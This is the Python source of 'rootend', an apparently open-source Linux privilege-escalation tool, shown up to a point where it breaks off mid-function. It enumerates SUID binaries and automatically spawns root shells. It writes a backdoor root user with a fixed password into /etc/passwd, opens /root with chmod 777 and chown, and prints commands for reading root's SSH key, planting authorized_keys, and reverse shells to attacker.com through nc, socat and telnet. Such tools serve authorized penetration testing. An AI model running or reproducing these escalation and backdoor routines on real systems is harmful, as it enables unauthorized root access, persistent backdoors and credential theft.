#!/usr/bin/env python3

"""
    rootend - A *nix Enumerator & Auto Privilege Escalation tool.
    This file is part of rootend Project
    Written by: @nickvourd
    Website: https://www.twelvesec.com/
    GIT: https://github.com/twelvesec/rootend/
    TwelveSec (@Twelvesec)
    This program is free software: you can redistribute it and/or modify
    it under the terms of the GNU General Public License as published by
    the Free Software Foundation, either version 3 of the License, or
    (at your option) any later version.
    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU General Public License for more details.
    You should have received a copy of the GNU General Public License
    along with this program.  If not, see <http://www.gnu.org/licenses/>.
    For more see the file 'LICENSE' for copying permission.
"""

#Modules area
import platform
import distro
import getpass
import shutil
import socket
import pwd
import grp
import argparse
import textwrap
from os import system, popen, environ, getegid, geteuid, getgid, getgroups, stat, walk, path
from sys import exit, argv
from datetime import datetime
from pathlib import Path
from subprocess import call


#variables area
__author__ = "@nickvourd"
__version__ = "1.5.8"
__license__ = "GPLv3"
__team__ = "@twelvesec"
__systems__ = "*nix"


#lists & arrays  area
__thanks__ = [ '@maldevel', 'servo' ]

defaults = [ "arping", "at", "bwrap", "chfn", "chrome-sandbox", "chsh", "dbus-daemon-launch-helper", "dmcrypt-get-device", "exim4", "fusermount", "gpasswd", "helper", "kismet_capture", "lxc-user-nic", "mount", "mount.cifs", "mount.ecryptfs_private", "mount.nfs", "newgidmap", "newgrp", "newuidmap", "ntfs-3g", "passwd", "ping", "ping6", "pkexec", "polkit-agent-helper-1", "pppd", "snap-confine", "ssh-keysign", "su", "sudo", "traceroute6.iputils", "ubuntu-core-launcher", "umount", "VBoxHeadless", "VBoxNetAdpCtl", "VBoxNetDHCP", "VBoxNetNAT", "VBoxSDL", "VBoxVolInfo", "VirtualBoxVM", "vmware-authd", "vmware-user-suid-wrapper", "vmware-vmx", "vmware-vmx-debug", "vmware-vmx-stats", "Xorg.wrap" ]

suid_for_read = { 'arp': '-> arp -v -f "/root/.ssh/id_rsa"', 'base32': '-> base32 "/root/.ssh/id_rsa" | base32 --decode', 'base64': '-> base64 "/root/.ssh/id_rsa" | base64 --decode', 'cat': '-> cat /root/.ssh/id_rsa', 'cut': '-> cut -d "" -f1 "/root/.ssh/id_rsa"', 'date': '-> date -f "/root/.ssh/id_rsa"', 'dd': '-> dd if="/root/.ssh/id_rsa"', 'dialog': '-> dialog --textbox "/root/.ssh/id_rsa" 0 0', 'diff': '-> diff --line-format=%L /dev/null "/root/.ssh/id_rsa"', 'eqn': '-> eqn "/root/.ssh/id_rsa"', 'expand': '-> expand "/root/.ssh/id_rsa"', 'file': '-> file -f "/root/.ssh/id_rsa"', 'fmt': '-> fmt -999 "/root/.ssh/id_rsa"', 'fold': '-> fold -w99999999 "/root/.ssh/id_rsa"', 'grep': '-> grep "" "/root/.ssh/id_rsa"', 'hd': '-> hd "/root/.ssh/id_rsa"', 'head': '-> head -c1G "/root/.ssh/id_rsa"', 'hexdump': '-> hexdump -C "/root/.ssh/id_rsa"', 'highlight': '-> highlight --no-doc --failsafe "/root/.ssh/id_rsa"', 'iconv': '-> iconv -f 8859_1 -t 8859_1 "/root/.ssh/id_rsa"', 'ip': '-> ip -force -batch "/root/.ssh/id_rsa"', 'jq': '-> jq -Rr . "/root/.ssh/id_rsa"', 'ksshell': '-> ksshell -i "/root/.ssh/id_rsa"', 'less': '-> less "/root/.ssh/id_rsa"', 'look': '-> look "" "/root/.ssh/id_rsa"', 'lwp-request': '-> lwp-request "file://root/.ssh/id_rsa"', 'more': '-> more "/root/.ssh/id_rsa"', 'nl': '-> nl -bn -w1 -s "" "/root/.ssh/id_rsa"', 'od': '-> od -An -c -w9999 "/root/.ssh/id_rsa"', 'pg': '-> pg "/root/.ssh/id_rsa"', 'sed': '-> sed "" "/root/.ssh/id_rsa"', 'soelim': '-> soelim "/root/.ssh/id_rsa"', 'sort': '-> sort -m "/root/.ssh/id_rsa"', 'x86_64-linux-gnu-strings': '-> strings "/root/.ssh/id_rsa"', 'sysctl': '-> sysctl -n "/../../root/.ssh/id_rsa"', 'tac': '-> tac -s "RANDOM" "/root/.ssh/id_rsa"', 'tail': '-> tail -c1G "/root/.ssh/id_rsa"', 'ul': '-> ul "/root/.ssh/id_rsa"', 'unexpand': '-> unexpand -t99999999 "/root/.ssh/id_rsa"', 'uniq': '-> uniq "/root/.ssh/id_rsa"', 'uuencode': '-> uuencode "/root/.ssh/id_rsa" /dev/stdout | uudecode', 'uudecode': '-> uuencode "/root/.ssh/id_rsa" /dev/stdout | uudecode', 'xxd': '-> xxd "/root/.ssh/id_rsa" | xxd -r', 'xz': '-> xz -c "/root/.ssh/id_rsa" | xz -d', 'zsoelim': '-> zsoelim "/root/.ssh/id_rsa"'}

suid_manual = { 'aria2c': '-> COMMAND=\'id\'\n-> TF=$(mktemp)\n-> echo "$COMMAND" > $TF\n-> chmod +x $TF\n\n-> aria2c --on-download-error=$TF http://x', 'restic': '-> RHOST=attacker.com\n-> RPORT=12345\n-> LFILE=file_or_dir_to_get\n-> NAME=backup_name\n\n-> restic backup -r "rest:http://$RHOST:$RPORT/$NAME" "$LFILE"', 'shuf': '-> LFILE=file_to_write\n\n-> shuf -e DATA -o "$LFILE"\n', 'tee': '-> LFILE=file_to_write\n\n-> echo DATA | ./tee -a "$LFILE"'}

suid_manual2 = { 'busybox': '-> busybox sh', 'rpm': '-> rpm --eval \'%{lua:os.execute("/bin/sh", "-p")}\'', 'rsync': '-> rsync -e \'sh -p -c "sh 0<&2 1>&2"\' 127.0.0.1:/dev/null', 'systemctl': '-> TF=$(mktemp).service\n-> echo \'[Service]\nType=oneshot\nExecStart=/bin/sh -c "id > /tmp/output"\n[Install]\nWantedBy=multi-user.target\' > $TF\n\n-> systemctl link $TF\n\n-> systemctl enable --now $TF', 'dmsetup': "-> dmsetup create base <<EOF\n0 3534848 linear /dev/loop0 94208\nEOF\n\n-> dmsetup ls --exec '/bin/sh -p -s'", 'emacs-gtk': '-> emacs -Q -nw --eval \'(term "/bin/sh -p")\'', 'gimp-2.10': '-> gimp -idf --batch-interpreter=python-fu-eval -b \'import os; os.execl("/bin/sh", "sh", "-p")\'', 'gtester': '-> TF=$(mktemp)\n-> echo \'#!/bin/sh -p\' > $TF\n-> echo \'exec /bin/sh -p 0<&1\' >> $TF\n-> chmod +x $TF\n\n-> gtester -q $TF', 'make': '-> make -s --eval=$\'x:\\n\\t-\'"/bin/sh -p"', 'nano': '-> nano\n^R^X\nreset; sh 1>&0 2>&0', 'openssl': '-> openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes\n\n-> openssl s_server -quiet -key key.pem -cert cert.pem -port 12345\n', 'perl': '-> perl -e \'exec "/bin/sh";\'', 'pico': '-> pico\n^R^X\nreset; sh 1>&0 2>&0', 'tftp': '-> RHOST=attacker.com\n\n-> tftp $RHOST\n-> put file_to_send', 'vim.basic': '-> vim -c \':py import os; os.execl("/bin/sh", "sh", "-pc", "reset; exec sh -p")\'', 'watch': '-> watch -x sh -c \'reset; exec sh 1>&0 2>&0\'', }

suid_manual3 = { 'bash': '-> bash -p', 'chroot': '-> chroot / /bin/sh -p', 'bsd-csh': '-> bsd-csh -b', 'dash': '-> dash -p', 'docker': '-> docker run -v /:/mnt --rm -it alpine chroot /mnt sh', 'env': '-> env /bin/sh -p', 'expect':'-> expect -c "spawn /bin/sh -p;interact"', 'find': '-> find . -exec /bin/sh -p \\; -quit', 'flock': '-> flock -u / /bin/sh -p', 'gdb': '-> gdb -q -nx -ex \'python import os; os.execl("/bin/sh", "sh", "-p")\' -ex quit', 'ionice':'-> ionice /bin/sh -p', 'ksh2020':'-> ksh -p', 'ld.so':'-> ld.so /bin/sh -p', 'logsave': '-> logsave /dev/null /bin/sh -i -p', 'nice': '-> nice /bin/sh -p', 'node':'-> node -e \'require("child_process").spawn("/bin/sh", ["-p"], {stdio: [0, 1, 2]});\'', 'nohup': '-> nohup /bin/sh -p -c "sh -p <$(tty) >$(tty) 2>$(tty)"', 'php7.4': '-> php -r "pcntl_exec(\'/bin/sh\', [\'-p\']);"', 'python2.7': '-> python -c \'import os; os.execl("/bin/sh", "sh", "-p")\'', 'python3.8': '-> python3 -c \'import os; os.execl("/bin/sh", "sh", "-p")\'', 'rlwrap':'-> rlwrap -H /dev/null /bin/sh -p', 'run-part': '-> run-parts --new-session --regex \'^sh$\' /bin --arg=\'-p\'', 'setarch': '-> setarch $(arch) /bin/sh -p', 'start-stop-daemon': '-> start-stop-daemon --start -n $RANDOM -S -x /bin/sh -- -p', 'stdbuf': '-> stdbuf -i0 /bin/sh -p', 'strace': '-> strace -o /dev/null /bin/sh -p', 'taskset': '-> taskset 1 /bin/sh -p', 'time': '-> time /bin/sh -p', 'timeout': '-> timeout 7s /bin/sh -p', 'unshare': '-> unshare -r /bin/sh', 'xargs': '-> xargs -a /dev/null sh -p', 'zsh': '-> zsh' }

suid_mody = [ "cp", "mv" ]

suid_mody2 = [ "chmod", "chown" ]

suid_download = [ "curl", "wget", "lwp-download" ]

suid_lim = { 'awk': '-> awk \'BEGIN {system("/bin/sh")}\'', 'byebug': '-> TF=$(mktemp)\n -> echo \'system("/bin/sh")\' > $TF\n\n-> byebug $TF\n-> continue','ed': '-> ed\n!/bin/sh', 'gawk': '-> gawk \'BEGIN {system("/bin/sh")}\'', 'git': '-> PAGER=\'sh -c "exec sh 0<&1"\' ./git -p help', 'iftop': '-> iftop\n!/bin/sh', 'ldconfig': '-> TF=$(mktemp -d)\n-> echo "$TF" > "$TF/conf"\n\n-> ldconfig -f "$TF/conf"', 'lua': '-> lua -e \'os.execute("/bin/sh")\'', 'mawk': '-> mawk \'BEGIN {system("/bin/sh")}\'', 'mysql': "-> mysql -e '\\! /bin/sh'", 'nawk': '-> nawk \'BEGIN {system("/bin/sh")}\'', 'nc': '-> RHOST=attacker.com\n-> RPORT=12345\n\n-> nc -e /bin/sh $RHOST $RPORT', 'nmap': '-> TF=$(mktemp)\n-> echo \'os.execute("/bin/sh")\' > $TF\n\n-> nmap --script=$TF', 'pic': '-> pic -U\n.PS\nsh X sh X', 'pry': '-> pry\nsystem("/bin/sh")', 'rvim': '-> rvim -c \':py import os; os.execl("/bin/sh", "sh", "-pc", "reset; exec sh -p")\'', 'scp': '-> TF=$(mktemp)\n-> echo \'sh 0<&2 1>&2\' > $TF\n-> chmod +x "$TF"\n\n-> scp -S $TF a b:', 'socat': '-> RHOST=attacker.com\n-> RPORT=12345\n\n-> socat tcp-connect:$RHOST:$RPORT exec:sh,pty,stderr,setsid,sigint,sane', 'sqlite3': "-> sqlite3 /dev/null '.shell /bin/sh'", 'tar': '-> tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh', 'telnet': '-> RHOST=attacker.com\n-> RPORT=12345\n\n-> telnet $RHOST $RPORT\n^]\n!/bin/sh', 'zip': "-> TF=$(mktemp -u)\n\n-> zip $TF /etc/hosts -T -TT 'sh #'\n-> sudo rm $TF" }

suid_exec = [ "bash", "chroot", "bsd-csh", "dash", "docker", "env", "expect", "find", "flock", "gdb", "ionice", "ksh2020", "ld.so", "logsave", "nice", "node", "nohup", "php7.4", "python2.7", "python3.8", "rlwrap", "run-parts", "setarch", "start-stop-daemon", "stdbuf", "strace", "taskset", "time", "timeout", "unshare", "xargs", "zsh" ]

php_files = [ "wp-config.php", "config.php", "connect.php", "wp-config.php", "configuration.php", "settings.php", "database.php", "db.php", "db_conn.php", "wp-config-sample.php" ]

redis_files = [ "6379.conf", "redis.conf" ]

capa_default = [ "mtr-packet", "gnome-keyring-daemon", "ping", "traceroute6.iputils", "gst-ptp-helper" ]

capa_exec = { "gdb": "-> gdb -nx -ex 'python import os; os.setuid(0)' -ex '!sh' -ex quit", "node":"-> node -e 'process.setuid(0); require('child_process').spawn('/bin/sh', {stdio: [0, 1, 2]});'", "perl":"-> perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec '/bin/sh';'", "php":"-> php -r 'posix_setuid(0); system('/bin/sh');", "ruby":"-> ruby -e 'Process::Sys.setuid(0); exec '/bin/sh''" }


#ascii art
message = '''
___________              .__                _________              
\__    ___/_  _  __ ____ |  |___  __ ____  /   _____/ ____   ____  
  |    |  \ \/ \/ // __ \|  |\  \/ // __ \ \_____  \_/ __ \_/ ___\ 
  |    |   \     /\  ___/|  |_\   /\  ___/ /        \  ___/\  \___ 
  |____|    \/\_/  \___  >____/\_/  \___  >_______  /\___  >\___  >
                       \/               \/        \/     \/     \/ 
rootend v.{} - Enumeration & Automation Privilege Escalation tool.
rootend is an open source tool licensed under {}.
Affected systems: {}.
Written by: {} of {}.
Special thanks to {} & {}.
https://www.twelvesec.com/
Please visit https://github.com/twelvesec/rootend for more..

'''.format(__version__, __license__, __systems__, __author__, __team__, __thanks__[0], __thanks__[1])


#functions area

#test_date function
def test_date():
    print("========================")
    print("[+] Process started at:")
    print("========================\n")
    now = datetime.now()
    dt_string = now.strftime("%d/%m/%Y %H:%M:%S")
    print(dt_string + "\n")


#find_whoami function
def find_whoami(user, user_id, group_id, real_id, supplemental_groups):
    print("===========")
    print("[+] User:")
    print("===========\n")
    if user != "root":
        print(user + '\n')
        print("=======================")
        print("[+] " + user + ' Details:')
        print("=======================\n")
        print("User id: " + str(user_id) + "\nGroup id: " + str(group_id) + "\nReal id: " + str(real_id))
        print("Supplemental groups: " + str(supplemental_groups) + '\n')
        home = str(Path.home())
        print("Home directory: " + home + "\n")
        shell_type = environ['SHELL']
        print("Type of shell: " + shell_type + "\n")
    else:
        print(user + '\n')
        call(["id"])
        print("\n")
        print("==========================")
        print("[!] You are already root!")
        print("==========================\n")
        exit()
    

#find_victim function
def find_victim():
    print("=============")
    print("[+] Victim:")
    print("=============\n")
    victim = socket.gethostname()
    print(victim + '\n')
    print("=========================")
    print("[+] " + victim + " Details:")
    print("=========================\n")
    victim_distro = distro.linux_distribution()
    print("Destribution: " + victim_distro[0])
    print("Version: " + victim_distro[1])
    print("Nickname: " + victim_distro[2] + "\n")
    print("Kernel version: " + platform.release() + "\n")
    print("Processor: " + platform.processor() + "\n")


#check_me function
def check_me(user, user_id, group_id, real_id, supplemental_groups):
    if group_id == 0 or user_id == 0 or real_id == 0:
        print("====================================================")
        print("[!] User " + user + " has already root's privileges!")
        print("====================================================\n")
        exit()
    else:
        for i in range(len(supplemental_groups)):
            #print(supplemental_groups[i])
            if supplemental_groups[i] == 0:
                print("====================================================")
                print("[!] User " + user + " has already root's privileges!")
                print("====================================================\n")
                exit()


#begin_pros function
def begin_pros():
    #set variables
    user = getpass.getuser()
    group_id = getegid()
    user_id = geteuid()
    real_id = getgid()
    supplemental_groups = getgroups()
    
    #call function named test_date
    test_date()

    #call function named find_victim
    find_victim()

    #call function named find_whoami
    find_whoami(user, user_id, group_id, real_id, supplemental_groups)

    #call function named check_me
    #check_me(user, user_id, group_id, real_id, supplemental_groups)
 
    return user


#important_msg function
def important_msg():
    print("=============")
    print("[!] Advice:")
    print("=============\n")
    print("-> Run the following command and read files from root!\n")
    print("==============")
    print("[*] Example:")
    print("==============\n")


#important_msg2 function
def important_msg2():
    print("=============")
    print("[!] Advice:")
    print("=============\n")
    print("-> Follow the below example and create files with root's permissions/ownership!\n")
    print("==============")
    print("[*] Example:")
    print("==============\n")


#important_msg3 function
def important_msg3():
    print("=============")
    print("[!] Advice:")
    print("=============\n")
    print("-> Maybe not sure, you can try to follow the below example and take root's privileges!\n")
    print("==============")
    print("[*] Example:")
    print("==============\n")


#important_msg0 function
def important_msg0():
    print("=============")
    print("[!] Advice:")
    print("=============\n")
    print("-> Follow the below example and take root's privileges!\n")
    print("==============")
    print("[*] Example:")
    print("==============\n")


#important_msg5 function
def important_msg5():
    print("=============")
    print("[!] Advice:")
    print("=============\n")
    print("-> If capability setted CAP_SETUID, you can use the following example...\n")
    print("=============")
    print("[!] Example:")
    print("=============\n")


#important_msg6 function
def important_msg6(): 
    print("=============")
    print("[!] Advice:")
    print("=============\n")
    print("-> Visit the below link and find the exploit!\n")
    print("===========")
    print("[*] Link:")
    print("===========\n")


#important_msg7 function
def important_msg7(): 
    print("=============")
    print("[!] Advice:")
    print("=============\n")
    print("-> Maybe, Not Sure! Use the following capability example and take root's privileges\n")
    print("=============")
    print("[!] Example:")
    print("=============\n")


#root_msg function
def root_msg():
    print("=======================================")
    print("[!] Shell Opened! You are root now! :)")
    print("=======================================\n")


#config_msg function
def config_msg():
    print("==========================================")
    print("[!] Try to configure /etc/passwd file...")
    print("==========================================\n")
    print("==================================")
    print("[!] Try to create a new user...")
    print("==================================\n")


#other_msg function
def other_msg():
    print("============================================================================")
    print("[!] Done! Use the following credentials in order to take root's privileges!")
    print("============================================================================\n")
    print(" -> Credentials:\n")
    print("------------------------------")
    print("|   Username  |   Password   |")
    print("------------------------------")
    print("|  superuser  | password1234 |")
    print("------------------------------\n")


#auto_chmod_msg function
def auto_chmod_msg():
    print("=========================================================")
    print("[!] Permissions of /root changed! You have access on it!")
    print("=========================================================\n")
    print("====================")
    print("-> Directory: /root")
    print("====================\n")


#auto_chown_msg function
def auto_chown_msg():
    print("==========================================================")
    print("[!] UID and GID of /root changed! You have access on it!")
    print("==========================================================\n")
    print("====================")
    print("-> Directory: /root")
    print("====================\n")


#ip_msg function
def ip_msg():
    print("===============")
    print("[!] Advice 2:")
    print("===============\n")
    print("-> The following example only works for Linux with CONFIG_NET_NS=y and you can take root's privileges.\n")
    print("=================")
    print("[*] Example 2:")
    print("=================\n")
    print("-> ip netns add foo\n")
    print("-> ip netns exec foo /bin/sh -p\n")
    print("-> ip netns delete foo\n")


#readelf_msg function
def readelf_msg():
    print("======================")
    print("[*] Important Notice:")
    print("======================\n")
    print("-> readelf is a tool which displays information about elf files! You can use it only for elf files...\n")


#cp_priv_esc function
def cp_priv_esc():
    shutil.copyfile('/etc/passwd', '/tmp/passwd')
    f = open('/tmp/passwd','a+')
    f.write('superuser:$1$superuse$D1NjirhAZKLO9jhBU9gyG.:0:0:root:/bin/bash')
    f.close()

    system("cp /tmp/passwd /etc/passwd")

    #call function named other_msg
    other_msg()


#mv_priv_esc function
def mv_priv_esc():
    shutil.copyfile('/etc/passwd', '/tmp/passwd')
    f = open('/tmp/passwd','a+')
    f.write('superuser:$1$superuse$D1NjirhAZKLO9jhBU9gyG.:0:0:root:/bin/bash')
    f.close()

    system("mv /tmp/passwd /etc/passwd")

    #call function named other_msg
    other_msg()


#curl_path function
def curl_path():
    print("-> Create a rsa keys to your local machines:")
    print("         ssh-keygen -t rsa\n")
    print("-> Open a web server in the same directory of rsa keys like:")
    print("         python3 -m http.server 8080\n")
    print("-> Use curl to download keys into /root:")
    print("         curl -o /root/.ssh/authorized_keys http://<your_ip>:<your_port>/id_rsa.pub\n")
    print("-> Try to connect to victim's machine with your id_rsa private key:")
    print("         ssh root@<victim's_ip> -i id_rsa\n\n")


#lwp_path function
def lwp_path():
    print("-> Create a rsa keys to your local machines:")
    print("         ssh-keygen -t rsa\n")
    print("-> Open a web server in the same directory of rsa keys like:")
    print("         python3 -m http.server 8080\n")
    print("-> Use lwp-download to download keys into /root:")
    print("         lwp-download http://<your_ip>:<your_port>/id_rsa.pub /root/.ssh/authorized_keys\n")
    print("-> Try to connect to victim's machine with your id_rsa private key:")
    print("         ssh root@<victim's_ip> -i id_rsa\n\n")


#wget_path function
def wget_path():
    print("-> Create a rsa keys to your local machines:")
    print("         ssh-keygen -t rsa\n")
    print("-> Open a web server in the same directory of rsa keys like:")
    print("         python3 -m http.server 8080\n")
    print("-> Use wget to download keys into /root:")
    print("         wget -O /root/.ssh/authorized_keys http://<your_ip>:<your_port>/id_rsa.pub\n")
    print("-> Try to connect to victim's machine with your id_rsa private key:")
    print("         ssh root@<victim's_ip> -i id_rsa\n\n")


#curl_priv_esc function
def curl_priv_esc():
    #call function named important_msg3
    important_msg3()

    #call function named curl_path
    curl_path()


#lwp_download_priv_esc function
def lwp_downlaod_priv_esc():
    #call function named important_msg3
    important_msg3()

    #call function named lwp_path
    lwp_path()


#wget_priv_esc function
def wget_priv_esc():
    #call function named important_msg3
    important_msg3()

    #call function named wget_path
    wget_path()


#rake_priv_esc function
def rake_priv_esc():
    #call function named important_msg3
    important_msg3()
    command = '''
-> rake -p '`/bin/sh 1>&0`'
    '''
    print(command + '\n')


#bash_priv_esc function
def bash_priv_esc():
    call(["bash","-p"])


#chroot_priv_esc function
def chroot_priv_esc():
    call(["chroot","/","/bin/sh","-p"])


#csh_priv_esc function
def csh_priv_esc():
    call(["csh","-b"])


#dash_priv_esc function
def dash_priv_esc():
    call(["dash","-p"])


#docker_priv_esc functionn
def docker_priv_esc():
    call(["docker","run","-v","/:/mnt","--rm","-it","alpine","chroot","/mnt","sh"])


#env_priv_esc function
def env_priv_esc():
    call(["env","/bin/sh","-p"])


#expect_priv_esc function
def expect_priv_esc():
    system('expect -c "spawn /bin/sh -p;interact"')


#find_priv_esc function
def find_priv_esc():
    system('find . -exec /bin/sh -p \; -quit')


#flock_priv_esc function
def flock_priv_esc():
    call(["flock","-u","/","/bin/sh","-p"])


#gdb_priv_esc function
def gdb_priv_esc():
    command = '''
gdb -nx -ex 'python import os; os.execl("/bin/sh", "sh", "-p")' -ex quit
    '''
    system(command)


#ionice_priv_esc function
def ionice_priv_esc():
    call(["ionice","/bin/sh","-p"])


#ksh_priv_esc function
def ksh_priv_esc():
    call(["ksh","-p"])


#ld_so_priv_esc funtion
def ld_so_priv_esc():
    call(["ld.so","/bin/sh","-p"])


#logsave_priv_esc function
def logsave_priv_esc():
    call(["logsave","/dev/null","/bin/sh","-i","-p"])


#nice_priv_esc function
def nice_priv_esc():
    call(["nice","/bin/sh","-p"])


#node_priv_esc function
def node_priv_esc():
    command='''
node -e 'require("child_process").spawn("/bin/sh", ["-p"], {stdio: [0, 1, 2]});'
    '''
    system(command)


#nohup_priv_esc function
def nohup_priv_esc():
    command='''
nohup /bin/sh -p -c "sh -p <$(tty) >$(tty) 2>$(tty)"
    '''
    system(command)


#php_priv_esc function
def php_priv_esc():
    command = '''
php -r "pcntl_exec('/bin/sh', ['-p']);"
    '''
    system(command)


#python_priv_esc function
def python_priv_esc():
    command = '''
python -c 'import os; os.execl("/bin/sh", "sh", "-p")'
    '''
    system(command)


#python3_priv_esc function
def python3_priv_esc():
    command = '''
python3 -c 'import os; os.execl("/bin/sh", "sh", "-p")'
    '''
    system(command)


#rlwrap_priv_esc function
def rlwrap_priv_esc():
    call(["rlwrap","-H","/dev/null","/bin/sh","-p"])


#run_parts_priv_esc function
def run_parts_priv_esc():
    command = '''
run-parts --new-session --regex '^sh$' /bin --arg='-p'
    '''
    system(command)


#setarch_priv_esc function
def setarch_priv_esc():
    system('setarch $(arch) /bin/sh -p')


#start_stop_daemon_priv_esc function
def start_stop_daemon_priv_esc():
    command = '''
start-stop-daemon --start -n $RANDOM -S -x /bin/sh -- -p
    '''
    system(command)


#stdbuf_priv_esc function
def stdbuf_priv_esc():
    call(["stdbuf","-i0","/bin/sh","-p"])


#strace_priv_esc function
def strace_priv_esc():
    call(["strace","-o","/dev/null","/bin/sh","-p"])


#taskset_priv_esc function
def taskset_priv_esc():
    call(["taskset","1","/bin/sh","-p"])


#time_priv_esc function
def time_priv_esc():
    call(["time","/bin/sh","-p"])


#timeout_priv_esc function
def timeout_priv_esc():
    system('timeout 7s /bin/sh -p')


#unshare_priv_esc function
def unshare_priv_esc():
    call(["unshare","-r","/bin/sh"])


#xargs_priv_esc function
def xargs_priv_esc():
    call(["xargs","-a","/dev/null","sh","-p"])


#zsh_priv_esc function
def zsh_priv_esc():
    call(["zsh"])


#readelf_priv_esc function
def readelf_priv_esc():
    #call function named readlef_msg
    readelf_msg()    
    print("=============")
    print("[*] Example:")
    print("=============\n")
    print('-> lfile=file_to_read\n')
    print('-> readelf -a @$lfile\n\n')


#chmod_priv_esc function
def chmod_priv_esc():
    system("chmod 777 /root")
    #call function named auto_chmod_msg
    auto_chmod_msg()
    call(["ls", "-la", "/root"])
    print("\n")


#chown_priv_esc function
def chown_priv_esc():
    system("chown -R $(id -un):$(id -gn) /root")
    #call function named auto_chown_msg
    auto_chown_msg()
    call(["ls", "-la", "/root"])
    print("\n")


#cp_priv_esc2 function
def cp_priv_esc2():
    #call function named important_msg2
    important_msg2()
    command = '''
-> LFILE=file_to_write
-> TF=$(mktemp)
-> echo "DATA" > $TF

-> cp $TF $LFILE\n
    '''
    print(command)


#mv_priv_esc2 function
def mv_priv_esc2():
    #call function named important_msg2
    important_msg2()
    command = '''
-> LFILE=file_to_write
-> TF=$(mktemp)
-> echo "DATA" > $TF

-> mv $TF $LFILE\n
    '''
    print(command)


#chown_priv_esc2 function
def chown_priv_esc2():
    #call function named important_msg2
    important_msg2()
    print('-> LFILE=/root\n')
    print('-> chown $(id -un):$(id -gn) $LFILE\n')


#chmod_priv_esc2 function
def chmod_priv_esc2():
    #call function named important_msg2
    important_msg2()
    print('-> LFILE=/root\n')
    print('-> chmod 0777 $LFILE\n')


#exim_priv_esc function
def exim_priv_esc():
    #call function named important_msg6
    important_msg6()
    print('-> https://www.exploit-db.com/exploits/46996\n\n')


#suid_exp function
def suid_exp(flag1,flag2,flag3):
    #find all suid binaries of system
    command = "find / -perm -4000 2>/dev/null"
    result = popen(command).read().strip().split("\n")

    for i in result:        
        name = i.split("/")[::-1][0]
        if name in defaults:
            if name == "exim4":
                command2 = 'exim4 --version 2>/dev/null'
                result2 = popen(command2).read().strip().split("\n")
                for y in result2:
                    #print(y)
                    vers1 = y.split(" ")[::1][2]
                    vers1 = float(vers1)
                    #print(type(vers1))
                    break
            
                if vers1 >= 4.87 and vers1 <= 4.91:
                    print("====================================")
                    print("[!] Found outdated version of exim!")
                    print("====================================\n")
                    #call function named exim_priv_esc
                    exim_priv_esc()

        if name not in defaults:
            binary_path = i
            print("========================================================")
            print("[!] Found intersting suid binary: " + binary_path)
            print("========================================================\n")
            print("=================================================")
            print("[!] Detailed permissions of " + binary_path + ":")
            print("=================================================\n")
            system('ls -la ' + binary_path)
            print("\n")
            if name in suid_for_read:
                if name == "ip":
                    #call function named imporant_msg
                    important_msg()
                    print(suid_for_read[name] + '\n\n')

                    #call function named ip_msg
                    ip_msg()
                else:
                    #call function named imporant_msg
                    important_msg()
                    print(suid_for_read[name] + '\n')
            elif name in suid_manual:
                #call function named imporant_msg2
                important_msg2()
                print(suid_manual[name] + '\n')
            elif name in suid_manual2:
                #call function important_msg3
                important_msg3() 
                print(suid_manual2[name] + '\n')
            elif name in suid_download:
                if name == "curl":
                    #call function named curl_priv_esc
                    curl_priv_esc()
                elif name == "wget":
                    #call function named wget_priv_esc
                    wget_priv_esc()
                elif name == "lwp-download":
                    #call function named lwp_download_priv_esc
                    lwp_downlaod_priv_esc()
            elif name == "rake":
                #call function named rake_priv_esc
                rake_priv_esc()
            elif name == "x86_64-linux-gnu-readelf":
                #call function named readelf_priv_esc
                readelf_priv_esc()
            elif name in suid_lim:
                if name == "nmap":
                    command = 'nmap --version'
                    result = popen(command).read().strip().split("\n")
                    for i in result:
                        vers = i.split(" ")[::1][2]
                        vers2 = vers.split(".")[::1][0]
                        vers2 = int(vers2)
                        #print(vers)
                        break

                    if vers2 < 4:
                        #call function named important_msg3
                        important_msg3()
                        print(suid_lim[name] + '\n')
                    else:
                        print("=========================================================================")
                        print("[!] Nmap version doesn't support suid binary privilege escalation mode!")
                        print("=========================================================================\n")
                        print("=========================")
                        print("[!] " + name + " version: " + vers)
                        print("=========================\n")
                else:
                    #call function named imporant_msg3
                    important_msg3()
                    print(suid_lim[name] + '\n')

            if flag3 == "auto":
                if name in suid_exec:
                    print("=================================")
                    print("[!] Try to do auto Escalation...")
                    print("=================================\n")
                    #call function named root_msg
                    root_msg()
                    if name == "bash":
                        #call function named bash_priv_esc
                        bash_priv_esc()
                    elif name == "chroot":
                        #call function named chroot_priv_esc
                        chroot_priv_esc()
                    elif name == "bsd-csh":
                        #call function named csh_priv_esc
                        csh_priv_esc()
                    elif name == "dash":
                        #call function named dash_priv_esc
                        dash_priv_esc()
                    elif name == "docker":
                        #call function named docker_priv_esc
                        docker_priv_esc()
                    elif name == "env":
                        #call function named env_priv_esc
                        env_priv_esc()
                    elif name == "expect":
                        #call function named expect_priv_esc
                        expect_priv_esc()
                    elif name == "find":
                        #call function named find_priv_esc
                        find_priv_esc()
                    elif name == "flock":
                        #call function anmed flock_priv_esc
                        flock_priv_esc()
                    elif name == "gdb":
                        #call function named gdb_priv_esc
                        gdb_priv_esc()
                    elif name == "ionice":
                        #call function named ionice_priv_esc
                        ionice_priv_esc()
                    elif name == "ksh2020":
                        #call function named ksh_priv_esc
                        ksh_priv_esc()
                    elif name == "ld.so":
                        #call function named ld_so_priv_esc
                        ld_so_priv_esc()
                    elif name == "logsave":
                        #call function named logsave_priv_esc
                        logsave_priv_esc()
                    elif name == "nice":
                        #call function named nice_priv_esc
                        nice_priv_esc()
                    elif name == "node":
                        #call function named node_priv_esc
                        node_priv_esc()
                    elif name == "nohup":
                        #call function named nohup_priv_esc
                        nohup_priv_esc()
                    elif name == "php7.4":
                        #call function named php_priv_esc
                        php_priv_esc()
                    elif name == "python2.7":
                        #call function named python_priv_esc
                        python_priv_esc()
                    elif name == "python3.8":
                        #call function named python3_priv_esc
                        python3_priv_esc()
                    elif name == "rlwrap":
                        #call function named rlwrap_priv_esc
                        rlwrap_priv_esc()
                    elif name == "run-parts":
                        #call function named run_parts_priv_esc
                        run_parts_priv_esc()
                    elif name == "setarch":
                        #call function named setarch_priv_esc
                        setarch_priv_esc()
                    elif name == "start-stop-daemon":
                        #call function named start_stop_daemon_priv_esc
